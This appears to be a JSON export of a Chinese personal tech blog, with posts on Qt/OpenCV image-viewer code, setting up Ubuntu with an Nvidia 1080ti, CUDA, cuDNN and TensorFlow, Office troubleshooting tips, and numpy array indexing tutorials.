//读取一幅图片，这里我们要将QString转换为String使用toLocal8Bit()函数，避免乱码问题 cv::Mat image = cv::imread(fileName.toLocal8Bit().data()); if(!image.data) &#123; QMessageBox::warning(this, tr(\"CVS\"), tr(\"Cannot read file %1\\n\") .arg(fileName));//添加头文件#include &lt;QMessageBox&gt; return false; &#125; else &#123; //将Mat转化为QPixmap，使用了我们写的一个函数 QPixmap img = CVS::cvMatToQPixmap(image); //显示在label中 this-&gt;setPixmap(img); //改变label的大小用于自适应图像大小 this-&gt;setScaledContents(true); &#125; setCurrentFile(fileName);//设置小窗口的标题 return true;&#125; 接着编写setCurrentFile 123456789101112131415//childwindow.cpp//设置小窗口的标题void ChildWindow::setCurrentFile(const QString &amp;fileName)&#123; curFile = QFileInfo(fileName).canonicalFilePath();//获取文件绝对路径，添加头文件#include &lt;QFileInfo&gt; setWindowTitle(userFriendlyCurrentFile() + \"[*]\");&#125;QString ChildWindow::userFriendlyCurrentFile()&#123; return strippedName(curFile);&#125;QString ChildWindow::strippedName(const QString &amp;fullFileName)&#123; return QFileInfo(fullFileName).fileName();&#125; 最后ChildWindow的头文件片段 123456789101112131415161718192021#include &lt;QLabel&gt;#include &lt;opencv2/opencv.hpp&gt;#include &lt;QImage&gt;#include \"qimageandmat.h\"class ChildWindow : public QLabel&#123; Q_OBJECTpublic: ChildWindow(); bool loadFile(const QString &amp;fileName); QString userFriendlyCurrentFile(); QString currentFile() &#123; return curFile; &#125;private: void setCurrentFile(const QString &amp;fileName); QString strippedName(const QString &amp;fullFileName); QString curFile;&#125;; 接着我们处理MainWindow 原来的mainwindow中的actionOpenFile槽函数这个时候变为 1234567//mainwindow.cppvoid MainWindow::on_actionOpenFile_triggered()&#123; fileName = QFileDialog::getOpenFileName(this); //文件打开窗口，添加头文件#include &lt;QFileDialog&gt; if (!fileName.isEmpty()) openFile(fileName);//打开文件&#125; 接着编写openFile函数 1234567//mainwindow.cpp//打开文件窗口bool MainWindow::openFile(const QString &amp;fileName)&#123; const bool succeeded = loadFile(fileName); //读取文件 return succeeded;&#125; 接着编写loadFile文件 123456789101112//mainwindow.cpp//读取图片bool MainWindow::loadFile(const QString &amp;fileName)&#123; ChildWindow *child = createChildWindow(); //创建一个子窗口 const bool succeeded = child-&gt;loadFile(fileName);//子窗口读取图片 if (succeeded) //如果读取成功，显示图片；否则，关闭 child-&gt;show(); else child-&gt;close(); return succeeded;&#125; 接着编写createChildWindow函数 12345678//mainwindow.cpp//创建子窗口ChildWindow *MainWindow::createChildWindow()&#123; ChildWindow *child = new ChildWindow; ui-&gt;mdiArea-&gt;addSubWindow(child); return child;&#125; 最后MainWindow的头文件片段 12345678910111213141516171819202122232425262728#include &lt;QMainWindow&gt;#include &lt;QMdiSubWindow&gt;#include \"childwindow.h\"namespace Ui &#123;class MainWindow;&#125;class MainWindow : public QMainWindow&#123; Q_OBJECTpublic: explicit MainWindow(QWidget *parent = 0); bool openFile(const QString &amp;fileName); ~MainWindow();private slots: void on_actionOpenFile_triggered();private: bool loadFile(const QString &amp;fileName); ChildWindow *createChildWindow(); QMdiArea *mdiArea; QString fileName; Ui::MainWindow *ui;&#125;; 接着运行 ok！^_^","categories":[{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/categories/QT/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"opencv","slug":"opencv","permalink":"http://coordinate.wang/tags/opencv/"},{"name":"qt","slug":"qt","permalink":"http://coordinate.wang/tags/qt/"}]},{"title":"深度学习主机配置：Ubuntu16.04+1080ti+cuda8+cudnn6+tensorflow1.3","slug":"2017-11-28-深度学习主机配置：Ubuntu16.04+1080ti+cuda8+cudnn6+tensorflow1.3","date":"2017-11-27T16:00:00.000Z","updated":"2018-02-18T08:39:47.747Z","comments":true,"path":"2017/11/28/2017-11-28-深度学习主机配置：Ubuntu16.04+1080ti+cuda8+cudnn6+tensorflow1.3/","link":"","permalink":"http://coordinate.wang/2017/11/28/2017-11-28-深度学习主机配置：Ubuntu16.04+1080ti+cuda8+cudnn6+tensorflow1.3/","excerpt":"由于在Ubuntu17.04+1080ti+cuda9+cudnn7+tensorflow1.4/1.3配置后，工作过程中出现了一些问题，比较好的做法是等待tensorflow1.5的发布，但是我没有时间去等QAQ。所以重装系统，QAQ。 和之前装机的方法一样，只是这里的系统是ubuntu16.04。系统安装好后，我们修改源。好，第一个坑出现了。 无线网卡驱动装好系统后，无线网卡无法使用（主要是我这里有线需要拨号上网，对就是这么的原始QAQ，dsl一直出问题） 我的网卡型号是Killer Wireless-AC 1535下载驱动 12sudo dpkg -i linux-firmware*.debsudo modprobe -r ath10k_pci &amp;&amp; sudo modprobe ath10k_pci","text":"由于在Ubuntu17.04+1080ti+cuda9+cudnn7+tensorflow1.4/1.3配置后，工作过程中出现了一些问题，比较好的做法是等待tensorflow1.5的发布，但是我没有时间去等QAQ。所以重装系统，QAQ。 和之前装机的方法一样，只是这里的系统是ubuntu16.04。系统安装好后，我们修改源。好，第一个坑出现了。 无线网卡驱动装好系统后，无线网卡无法使用（主要是我这里有线需要拨号上网，对就是这么的原始QAQ，dsl一直出问题） 我的网卡型号是Killer Wireless-AC 1535下载驱动 12sudo dpkg -i linux-firmware*.debsudo modprobe -r ath10k_pci &amp;&amp; sudo modprobe ath10k_pci 下载软件仓库信息失败我尝试着去更换源，确实在有的源解决了这个问题，但是我不推荐你这么去做。我这里希望我的源是aliyun，但是它一更新后就会出现下面的问题。 1*** Error in `appstreamcli': double free or corruption (fasttop): 0x0000000001549c80 *** 解决方法 12sudo apt-get purge libappstream3sudo apt-get update 安装显卡驱动我推荐你先安装vim，因为我觉得vi不怎么好用 1sudo apt-get install vim 接着去禁用nouveau驱动（这是一个开源的驱动，对nvidia显卡不支持） 1sudo vim /etc/modprobe.d/blacklist-nouveau.conf 在后面添加 1blacklist nouveau 接着更新一下 1sudo update-initramfs -u 修改之后需要重启系统。 重启后可以使用以下命令： 1lsmod | grep nouveau 如果什么都没有的话，禁用成功。我这里要说的是，大家都这样做了，所以我这样做了，但是如果不禁用会不会有问题，我不知道（有人说没问题）。 先进入文本模式（Ctrl+Alt+F1），接着使用这条指令，添加一个源 1sudo add-apt-repository ppa:graphics-drivers/ppa 关闭图形化窗口 1sudo service lightdm stop 先更新一下，因为我们添加了一个源 1sudo apt-get update 使用这个命令下载安装驱动（我的显卡是1080ti所以使用381，没有使用384，很多人说这个有问题，不想再被坑了） 1sudo apt-get install nvidia-381 这次安装的过程中出现了这样的一个问题 pcie bus error 先恢复图形环境 1sudo service lightdm start Ctrl+Alt+F7进入图形界面 1sudo vim /etc/default/grub 将其中的 1GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash\" 修改为 1GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash nomodeset\" 然后更新sudo update-grub，后重启电脑。 接着按照之前的步骤安装驱动就可以了，很高兴的是，这次并没有像Ubuntu17.04那样出现下载出错的问题。 装好后，恢复图形环境 1sudo service lightdm start Ctrl+Alt+F7进入图形界面，关机。 将独立显卡插上，将视屏线插在独显上，开机，这个时候你会发现，系统可以打开了，不再是黑屏。 进入系统后，输入下面指令 1nvidia-smi 如果没有出现报错，那么恭喜你ubuntu装好了。 安装pip接着我们要先安装pip源 1sudo apt-get install python-pip 接着cd到根目录，使用 1ls -la 这个时候应该可以看到.config文件夹，进入这个文件夹（cd .config），建立一个pip文件夹（mkdir pip），进入pip文件夹（cd pip），接着建立pip.conf文件（vim pip.conf），按i（表示输入文本）输入以下内容 12[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple 输入:wq（保存并退出）。 以上步骤是要修改pip的源，这样安装会更加的快。 安装cuda8下载好cuda8的.run文件，注意这里不要下载.deb文件（据说有坑），应该是两个文件，其中一个是补丁文件。 使用下面指令安装 1sudo ./cuda_8.0.61_375.26_linux.run 这个安装的过程没有什么困难的，唯一一个要注意的地方就是在选择安装驱动时，选n 装好后打上补丁 1sudo ./cuda_8.0.61.2_linux.run 我这里的samples文件是在home文件夹下（各位可能是在/usr/local/cuda-8.0/下） 现在桌面建立一个文件夹test，进入test文件夹（cd test）。使用下面的命令，将cuda例子文件复制进去 1cp -r /home/nvidia_samples/ . 进入samples文件夹（cd samples），输入指令make -j，进行编译，编译要花一点时间。 编译好后切换到release文件夹 1cd ./bin/x86_64/linux/release 执行下面指令 1./deviceQuery 查看最后结果，如果是Result = PASS，那就ok。 接着cd到根目录。编辑.bashrc文件（vim .bashrc，不过新装的系统好像没有这个文件，没有的话跳过这步），在文件结尾添加下面的语句 1234#cuda8.0export PATH=/usr/local/cuda/bin$&#123;PATH:+:$&#123;PATH&#125;&#125; export LD_LIBRARY_PATH=/usr/local/cuda/lib64$&#123;LD_LIBRARY_PATH:+:$&#123;LD_LIBRARY_PATH&#125;&#125; export CUDA_HOME=/usr/local/cuda 输入:wq（保存退出）。接着在命令窗口输入source .bashrc，让文件生效。 安装cudnn6推荐安装cudnn6，不要安装cudnn7 接着去官网下载cudnn6安装文件，但是好像最近无法下载了，我有时间会上传一份。（需要的同学留言，我发给你） 下载好后输入下列指令将相关文件拷贝到cuda安装目录下即可。 12345tar -zxvf cudnn-8.0-linux-x64-v6.0.tgzsudo cp cuda/include/cudnn.h /usr/local/cuda/include/ sudo cp -a cuda/lib64/libcudnn* /usr/local/cuda/lib64/ sudo chmod a+r /usr/local/cuda/include/cudnn.h sudo chmod a+r /usr/local/cuda/lib64/libcudnn* 注意上面第二条指令，这里多加了一个-a，在官方给的方案里面没有，我建议你这样做，否则会出现连接出错的问题。 安装tensorflow1.3接着我们开始安装tensorflow1.3，在此之前，先安装一个libcupti-dev库 1sudo apt-get install libcupti-dev 接着如果使用 1sudo pip install tensorflow-gpu 会安装tensorflow1.4的版本，我觉得如果你是使用cuda8的用户，我推荐你去安装tensorflow1.3。 1sudo pip install tensorflow-gpu==1.3 装好后我们在python中（命令窗口输入python）测试一下 1import tensorflow as tf 如果没有报错的话，就可以了date: 2017-11-28 00:00:00。","categories":[{"name":"index","slug":"index","permalink":"http://coordinate.wang/categories/index/"}],"tags":[{"name":"tensorflow","slug":"tensorflow","permalink":"http://coordinate.wang/tags/tensorflow/"},{"name":"Dell","slug":"Dell","permalink":"http://coordinate.wang/tags/Dell/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://coordinate.wang/tags/Ubuntu/"},{"name":"1080ti","slug":"1080ti","permalink":"http://coordinate.wang/tags/1080ti/"},{"name":"cuda","slug":"cuda","permalink":"http://coordinate.wang/tags/cuda/"},{"name":"cudnn","slug":"cudnn","permalink":"http://coordinate.wang/tags/cudnn/"}]},{"title":"深度学习主机配置：Ubuntu17.04+1080ti+cuda9+cudnn7+tensorflow1.4/1.3","slug":"2017-11-15-深度学习主机配置Ubuntu17_04+1080ti+cuda9+cudnn7+tensorflow","date":"2017-11-14T16:00:00.000Z","updated":"2018-02-18T08:39:56.912Z","comments":true,"path":"2017/11/15/2017-11-15-深度学习主机配置Ubuntu17_04+1080ti+cuda9+cudnn7+tensorflow/","link":"","permalink":"http://coordinate.wang/2017/11/15/2017-11-15-深度学习主机配置Ubuntu17_04+1080ti+cuda9+cudnn7+tensorflow/","excerpt":"在此之前你应该已经装好了Ubuntu17.04，如果你对于装系统有什么疑问的话，请看这篇Dell Alienware Aurora R6 （1080ti）安装Ubuntu17.04记录 首先我们要先安装pip源 1sudo apt-get install python-pip 接着cd到根目录，使用 1ls -la","text":"在此之前你应该已经装好了Ubuntu17.04，如果你对于装系统有什么疑问的话，请看这篇Dell Alienware Aurora R6 （1080ti）安装Ubuntu17.04记录 首先我们要先安装pip源 1sudo apt-get install python-pip 接着cd到根目录，使用 1ls -la 这个时候应该可以看到.config文件夹，进入这个文件夹（cd .config），建立一个pip文件夹（mkdir pip），进入pip文件夹（cd pip），接着建立pip.conf文件（vim pip.conf），按i（表示输入文本）输入以下内容 12[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple 输入:wq（保存并退出）。 以上步骤是要修改pip的源，这样安装会更加的快。 安装cuda9.0和cudnn7去官网下载cuda9.0安装包 按照上面说的安装步骤安装即可。 接着我们对cuda9下面的例子测试一下，以保证我们装好了cuda 现在桌面建立一个文件夹test，进入test文件夹（cd test）。使用下面的命令，将cuda例子文件复制进去 1cp -r /usr/local/cuda-9.0/samples/ . 进入samples文件夹（cd samples），输入指令make，进行编译，编译要花很长时间。 编译好后，进入其中一个文件夹，我这里是进入了cd ./1_Utilities/bandwidthTest，接着输入 1./bandwidthTest 查看最后结果，如果是Result = PASS，那就ok。 接着cd到根目录。编辑.bashrc文件（vim .bashrc，不过新装的系统好像没有这个文件，没有的话跳过这步），在文件结尾添加下面的语句 1234#cuda9.0export PATH=/usr/local/cuda/bin$&#123;PATH:+:$&#123;PATH&#125;&#125; export LD_LIBRARY_PATH=/usr/local/cuda/lib64$&#123;LD_LIBRARY_PATH:+:$&#123;LD_LIBRARY_PATH&#125;&#125; export CUDA_HOME=/usr/local/cuda 输入:wq（保存退出）。接着在命令窗口输入source .bashrc，让文件生效。 接着去官网下载cudnn7安装文件，但是好像最近无法下载了，我有时间会上传一份。 下载好后输入下列指令将相关文件拷贝到cuda安装目录下即可。 12345tar -zxvf cudnn-9.0-linux-x64-v7.tgz sudo cp cuda/include/cudnn.h /usr/local/cuda/include/ sudo cp -a cuda/lib64/libcudnn* /usr/local/cuda/lib64/ sudo chmod a+r /usr/local/cuda/include/cudnn.h sudo chmod a+r /usr/local/cuda/lib64/libcudnn* 注意上面第二条指令，这里多加了一个-a，在官方给的方案里面没有，我建议你这样做，否则会出现连接出错的问题。如果你忘记了，可以参考下面做法 1234cd /usr/local/cuda/lib64/sudo rm -rf libcudnn.so libcudnn.so.7.0 sudo ln -s libcudnn.so.7.0.64 libcudnn.so.7.0 sudo ln -s libcudnn.so.7.0 libcudnn.so 其实是相同的道理。 安装tensorflow1.4这是本次安装的重难点，因为tensorflow1.3/1.4对于cuda9并没有支持，所以安装中会出现一些问题。可行的办法有自己编译tensorflow文件进行安装，但是我不推荐你这样去做。 在github找到了别人编译好的cuda9补丁版tensorflow1.4，tensorflow-1.4.0-cp27-cp27mu-linux_x86_64.whl索性就拿来直接用。 使用这个之前，你要先安装mkl。在此之前你要确认你的cpu是否是以下系列之一 1234567Intel Atom(R) processor with Intel(R) SSE4.1 support4th, 5th, 6th and 7th generation Intel(R) Core processorIntel(R) Xeon(R) processor E5 v3 family (code named Haswell)Intel(R) Xeon(R) processor E5 v4 family (code named Broadwell)Intel(R) Xeon(R) Platinum processor family (code name Skylake)Intel(R) Xeon Phi(TM) product family x200 (code named Knights Landing)Future Intel(R) Xeon Phi(TM) processor (code named Knights Mill) 如果不是，这个方法就可能不适用了，请使用编译tensorflow源码的办法。 如果cpu是其中的话，我们先要安装git 1sudo apt-get install git 接着下载mkl的包 1git clone https://github.com/01org/mkl-dnn.git 接着安装cmake和doxygen 12sudo apt-get install Cmakesudo apt-get install Doxygen 接着使用下面命令进入文件夹，下载相关文件 1cd scripts &amp;&amp; ./prepare_mkl.sh &amp;&amp; cd .. 如果出错的话，你可以在这里下载，我这里下载的是mklml_lnx_2018.0.1.20171007.tgz 现在之前下载好的mkl文件夹里面建立一个external文件夹。下载好现在的这个文件后解压（双击-&gt;提取），将加压后的文件夹里面的内容，copy到external文件夹中。 回到mkl目录下，接着建立一个bulid文件夹，进行编译 1mkdir -p build &amp;&amp; cd build &amp;&amp; cmake .. &amp;&amp; make 接着测试我们的编译文件是否有效，使用 1sudo make test 接着生成doc文件 1sudo make doc 最后安装 1sudo make install 在此之前如果出现错误的话，可以使用sudo+命令再次尝试。 安装完成后，应该会有这样几个文件 共享库 (/usr/local/lib)： libiomp5.so libmkldnn.so libmklml_intel.so 标头文件 (/usr/local/include)： mkldnn.h mkldnn.hpp mkldnn_types.h 文档 (/usr/local/share/doc/mkldnn)： 英特尔许可和版权声明 构成 HTML 文档的各种文件（在 /reference/html 之下） cd到根目录。编辑.bashrc文件（vim .bahsrc，没有的话，跳过这步），和之前做法一样。在文件最后添加 12#mklexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib 然后输入:wq退出，在命令窗口输入source .bashrc让文件生效。 接着我们开始安装tensorflow1.4，在此之前，先安装一个libcupti-dev库 1sudo apt-get install libcupti-dev 接着先回到下载tensorflow的目录，就可以安装了 1sudo pip install tensorflow-1.4.0-cp27-cp27mu-linux_x86_64.whl 装好后我们在python中（命令窗口输入python）测试一下 1import tensorflow as tf 如果没有报错的话，就可以了。如果报错的话，例如 1ImportError: libmklml_intel.so: cannot open shared object file: No such file or directory 可能是你的mkl环境没有配置好。 如果有任何问题，请及时指出，我不想我的文章对大家造成误导，谢谢！！！^_date: 2017-11-15 00:00:00^","categories":[{"name":"index","slug":"index","permalink":"http://coordinate.wang/categories/index/"}],"tags":[{"name":"tensorflow","slug":"tensorflow","permalink":"http://coordinate.wang/tags/tensorflow/"},{"name":"Dell","slug":"Dell","permalink":"http://coordinate.wang/tags/Dell/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://coordinate.wang/tags/Ubuntu/"},{"name":"1080ti","slug":"1080ti","permalink":"http://coordinate.wang/tags/1080ti/"},{"name":"cuda","slug":"cuda","permalink":"http://coordinate.wang/tags/cuda/"},{"name":"cudnn","slug":"cudnn","permalink":"http://coordinate.wang/tags/cudnn/"}]},{"title":"Dell Alienware Aurora R6（1080ti）安装Ubuntu17.04记录","slug":"2017-11-14-Dell-Alienware-Aurora-R6-安装Ubuntu17.04记录","date":"2017-11-13T16:00:00.000Z","updated":"2018-02-18T08:40:04.377Z","comments":true,"path":"2017/11/14/2017-11-14-Dell-Alienware-Aurora-R6-安装Ubuntu17.04记录/","link":"","permalink":"http://coordinate.wang/2017/11/14/2017-11-14-Dell-Alienware-Aurora-R6-安装Ubuntu17.04记录/","excerpt":"写这篇文章的时候，我内心是非常舒畅的，电脑是昨天下午到的，今天终于把Ubuntu17.04配置好了。希望我这篇文章对各位有一些启发。 首先我要强调，网络上的一些指导性教程都是有时限的，也就是说可能对你的机器不适用，但是如果你理解了其中的原理的话，万变不离其宗！！！ bios的设置先说一下第一个比较头疼的问题，bios的设置（我这里是F2打开）。secure boot选项要设置为disabled，至少我是这样做的，我后来也没有测试设置成enabled会有什么问题。这一点我保留意见，大家可以自己尝试一下。 接下来是关于uefi和legacy的问题，很多教程中都是使用legacy，但是经过我的尝试，我这里选择uefi，uefi是一种新的装机手法，而legacy是老的。所以对于那些10年之后的电脑，我强烈推荐你使用uefi。 接着是AHCI和RAID的问题，对于双硬盘的主机都可能会面对的问题。如果你要安装ubuntu的话，必须使用AHCI。 别的都不变，save and reset。","text":"写这篇文章的时候，我内心是非常舒畅的，电脑是昨天下午到的，今天终于把Ubuntu17.04配置好了。希望我这篇文章对各位有一些启发。 首先我要强调，网络上的一些指导性教程都是有时限的，也就是说可能对你的机器不适用，但是如果你理解了其中的原理的话，万变不离其宗！！！ bios的设置先说一下第一个比较头疼的问题，bios的设置（我这里是F2打开）。secure boot选项要设置为disabled，至少我是这样做的，我后来也没有测试设置成enabled会有什么问题。这一点我保留意见，大家可以自己尝试一下。 接下来是关于uefi和legacy的问题，很多教程中都是使用legacy，但是经过我的尝试，我这里选择uefi，uefi是一种新的装机手法，而legacy是老的。所以对于那些10年之后的电脑，我强烈推荐你使用uefi。 接着是AHCI和RAID的问题，对于双硬盘的主机都可能会面对的问题。如果你要安装ubuntu的话，必须使用AHCI。 别的都不变，save and reset。 做ubuntu系统盘因为我在bios中设置了uefi，所以我这里使用rufus这个工具。如果你使用legacy（我不推荐你这样去做），可以使用软碟通这个工具。 这里主要的问题之第二个选项，按照图上去选就可以了。为什么？这里我要说一说GPT分区和MBR分区，如果你前面选择的是uefi，那么这里就是用GPT。具体区别看这篇。 我这里是使用winPE工具把两个硬盘都设置为GPT分区（如果使用winPE的话，你要先把uefi改为legacy。然后save and reset后，在bios中就可以看到启动顺序，将u盘设置为第一启动） 接着再改回uefi 并且save and reset，进bios设置u盘第一启动。如果这个时候你看不到u盘选项的话，我这里是按F12打开一个类似于bios的东西（不同电脑不同），它里面有bios选项，也有u盘选项，选中u盘，然后回车装机。 安装ubuntu17.04我推荐你使用新版本的Ubuntu，因为在硬件驱动方面，它会好很多。 首先你要把下你的独立显卡，一定要这样做，当然网上有用nomodeset这种方式的，我也尝试了，但是由于某些问题，一开始没弄好，所以如果你的电脑是有核心显卡的或者有亮机卡，我推荐你就我的方法这样做吧。 先将显示器插在核心显卡上，接着装系统。这个时候我们面对一个问题，系统是装在机械硬盘上还是固态硬盘上。我一开始把系统装在固态上，但是开机总是出现boot failure的问题。为什么？PCIe M.2固态硬盘目前驱动方面会有问题，我查到有人在这种固态上成功了安装ubuntu17.04（装NVME drive is by Liteon，但我不知道怎么去做），但是当时我整个人都很不好，所以没有去尝试。所以你也不想尝试的话，就装在机械上吧。 装Linux系统，如果不清楚各个分区的作用的话，你就选择默认安装选项吧，不要自己去设置各个分区了。接着很顺利的装好了Ubuntu17.04。 进入系统后，你应该先在系统选项中，选择更新中设置更新源是中国服务器，我选择了aliyun。我不推荐你，通过编辑文件的方式修改源（当然你可以这样做），还是让问题更加的简单吧！！！ 我推荐你先安装vim，因为我觉得vi不怎么好用 1sudo apt-get install vim 接着去禁用nouveau驱动（这是一个开源的驱动，对nvidia显卡不支持） 1sudo vim /etc/modprobe.d/blacklist-nouveau.conf 在后面添加 1blacklist nouveau 接着更新一下 1sudo update-initramfs -u 修改之后需要重启系统。 重启后可以使用以下命令： 1lsmod | grep nouveau 如果什么都没有的话，禁用成功。我这里要说的是，大家都这样做了，所以我这样做了，但是如果不禁用会不会有问题，我不知道（有人说没问题）。 先进入文本模式（Ctrl+Alt+F1），接着使用这条指令，添加一个源 1sudo add-apt-repository ppa:graphics-drivers/ppa 关闭图形化窗口 1sudo service lightdm stop 先更新一下，因为我们添加了一个源 1sudo apt-get update 使用这个命令下载安装驱动（我的显卡是1080ti所以使用384，具体数字自己去查查） 1sudo apt-get install nvidia-384 安装过程中，可能下载会出现一些问题（突然中断），这个时候，你要等他结束，然后根据错误提示操作（我这里不记得当时的操作是什么了），然后再次使用上面的指令sudo apt-get install nvidia-384。如果没有发生，那就更好了。 装好后，恢复图形环境 1sudo service lightdm start Ctrl+Alt+F7进入图形界面，关机。 将独立显卡插上，将视屏线插在独显上，开机，这个时候你会发现，系统可以打开了，不再是黑屏。 进入系统后，输入下面指令 1nvidia-smi 如果没有出现报错，那么恭喜你ubuntu装好了。 我这里还有一个小问题，就是在关机的时候，会卡死在关机界面，关不了机，只能长按电源键关机。怎么解决这个问题，等我搞定了再写。 下一篇讲介绍深度学习主机配置：Ubuntu17.04+1080ti+cuda9+cudnn7+tensorflow1.4/1.3 如果有任何问题，请及时指出，我不想我的文章对大家造成误导，谢谢！！！^_^","categories":[{"name":"index","slug":"index","permalink":"http://coordinate.wang/categories/index/"}],"tags":[{"name":"Dell","slug":"Dell","permalink":"http://coordinate.wang/tags/Dell/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://coordinate.wang/tags/Ubuntu/"}]},{"title":"解决office word 2016 、2013等一直正在启动的问题","slug":"2017-11-13-解决office-word-2016-、2013等一直正在启动的问题","date":"2017-11-12T16:00:00.000Z","updated":"2018-02-18T03:29:07.385Z","comments":true,"path":"2017/11/13/2017-11-13-解决office-word-2016-、2013等一直正在启动的问题/","link":"","permalink":"http://coordinate.wang/2017/11/13/2017-11-13-解决office-word-2016-、2013等一直正在启动的问题/","excerpt":"","text":"相信很多人都碰到过这个问题，我当时认为是office损坏问题，卸了重装，结果问题还在。官方给出的解决方法就是重装office，呵呵！！！后来意外发现了这个解决方案。 打开任务管理器，关闭其中的spoolsv.exe进程，你会发现word就可以打开了。","categories":[{"name":"index","slug":"index","permalink":"http://coordinate.wang/categories/index/"}],"tags":[{"name":"office","slug":"office","permalink":"http://coordinate.wang/tags/office/"},{"name":"uninstall","slug":"uninstall","permalink":"http://coordinate.wang/tags/uninstall/"}]},{"title":"使用QT和opencv3.3进行目标检测(YOLO)","slug":"2017-11-12-使用QT和opencv3.3进行目标检测(YOLO)","date":"2017-11-11T16:00:00.000Z","updated":"2018-02-18T03:29:07.385Z","comments":true,"path":"2017/11/12/2017-11-12-使用QT和opencv3.3进行目标检测(YOLO)/","link":"","permalink":"http://coordinate.wang/2017/11/12/2017-11-12-使用QT和opencv3.3进行目标检测(YOLO)/","excerpt":"","text":"这篇文章先放个图，准备有时间写 我这里使用的是YOLO2的方法实现的，没有使用cudnn加速，所以速度上慢了点，不过对于高端的显卡来说，我觉得可以做到视屏级的图片产生速度。并且我这里并没有训练好数据，只是一个测试，但是效果还不错。 据说点赞可以加快编辑进度哦^_^!!!","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"numpy","slug":"numpy","permalink":"http://coordinate.wang/tags/numpy/"}]},{"title":"numpy.array切片和索引操作","slug":"2017-11-11-numpy.array切片和索引操作","date":"2017-11-10T16:00:00.000Z","updated":"2018-02-18T08:40:26.585Z","comments":true,"path":"2017/11/11/2017-11-11-numpy.array切片和索引操作/","link":"","permalink":"http://coordinate.wang/2017/11/11/2017-11-11-numpy.array切片和索引操作/","excerpt":"基本索引操作 12345import numpy as nparr = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])print arr[2]#第2行的数组print arr[0][2]#第0行第2列的值print arr[0, 2] # 普通Python数组不能用，同上 123[7 8 9]33","text":"基本索引操作 12345import numpy as nparr = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])print arr[2]#第2行的数组print arr[0][2]#第0行第2列的值print arr[0, 2] # 普通Python数组不能用，同上 123[7 8 9]33 切片操作 1234arr = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])print arr[:]#打印整个3*3数列print arr[:2]#打印0，1行print arr[:1, :2]#打印0行，0，1列 123456[[1 2 3] [4 5 6] [7 8 9]][[1 2 3] [4 5 6]][[1 2]] 布尔型索引 1234567891011import numpy as npimport numpy.random as np_randomname_arr = np.array(['Bob', 'Joe', 'Will'])rnd_arr = np_random.randn(3, 3) # 随机3*3数组print name_arr == 'Bob' # 返回布尔数组，元素等于'Bob'为True，否则False。print rnd_arr[name_arr == 'Bob'] # 利用布尔数组选择行，第0行print rnd_arr[name_arr == 'Bob', :2] # 增加限制打印列的范围，第0行 前2列print rnd_arr[~(name_arr == 'Bob')] # 对布尔数组的内容取反，第1，2列print rnd_arr[(name_arr == 'Bob') | (name_arr == 'Will')] # 逻辑运算混合结果rnd_arr[name_arr != 'Joe'] = 7 # 先布尔数组选择行，然后把每行的元素设置为7。print rnd_arr 12345678910111213[[-0.09102884 -0.09452611 1.42854702] [ 2.15963354 0.24216261 -2.26044752] [-0.72741325 -1.085561 0.54600936]][ True False False][[-0.09102884 -0.09452611 1.42854702]][[-0.09102884 -0.09452611]][[ 2.15963354 0.24216261 -2.26044752] [-0.72741325 -1.085561 0.54600936]][[-0.09102884 -0.09452611 1.42854702] [-0.72741325 -1.085561 0.54600936]][[ 7. 7. 7. ] [ 2.15963354 0.24216261 -2.26044752] [ 7. 7. 7. ]] 花式索引（Fancy indexing） 1234567arr = np_random.randn(3, 3) # 随机3*3数组print arrprint arr[[1, -1]]# 打印arr[1],a[-1]行print arr[[0, 1], [0, 1]]#打印a[0, 0],a[1, 1]print arr[[0, 1]][:, [1, 2]]#打印0,1行的1,2列print arr[:2, [1,2]]#同上print arr[np.ix_([0, 1], [1, 2])]#同上，最清楚的写法 12345678910[[-0.60100046 -0.16245393 0.04618795] [-0.05029884 -1.43052367 -0.91403785] [-1.445763 -1.4240193 -0.79258699]][[-0.05029884 -1.43052367 -0.91403785] [-1.445763 -1.4240193 -0.79258699]][-0.60100046 -1.43052367][[-0.16245393 0.04618795] [-1.43052367 -0.91403785]][[-0.16245393 0.04618795] [-1.43052367 -0.91403785]]","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"numpy","slug":"numpy","permalink":"http://coordinate.wang/tags/numpy/"}]},{"title":"如何有效地卸载office","slug":"2017-11-10-如何有效地卸载office","date":"2017-11-09T16:00:00.000Z","updated":"2018-02-18T03:29:07.369Z","comments":true,"path":"2017/11/10/2017-11-10-如何有效地卸载office/","link":"","permalink":"http://coordinate.wang/2017/11/10/2017-11-10-如何有效地卸载office/","excerpt":"","text":"在平时office的卸载时经常出现一些论七八糟的问题。 这里给出一个统一的答案，就是使用官方的卸载工具 下载完按步骤操作即可，这时候你只要开着电脑，泡杯咖啡，等它卸载完成。最后要记得重启电脑。^_^!!!","categories":[{"name":"index","slug":"index","permalink":"http://coordinate.wang/categories/index/"}],"tags":[{"name":"office","slug":"office","permalink":"http://coordinate.wang/tags/office/"},{"name":"uninstall","slug":"uninstall","permalink":"http://coordinate.wang/tags/uninstall/"}]},{"title":"numpy.array 的创建","slug":"2017-11-9-numpy.array-的创建","date":"2017-11-08T16:00:00.000Z","updated":"2018-02-18T08:40:42.252Z","comments":true,"path":"2017/11/09/2017-11-9-numpy.array-的创建/","link":"","permalink":"http://coordinate.wang/2017/11/09/2017-11-9-numpy.array-的创建/","excerpt":"通过array将数据（列表、元祖、数组等序列类型）转化为numpy array 12345import numpy as npdata = (1, 2, 3.1)data2 = [1, 2, 3.1]arr = np.array(data)arr2 = np.array(data2) 通过zeros创建全为0的numpy array 12np.zeros(3) # 生成包含3个0的一维数组np.zeros((3, 3)) # 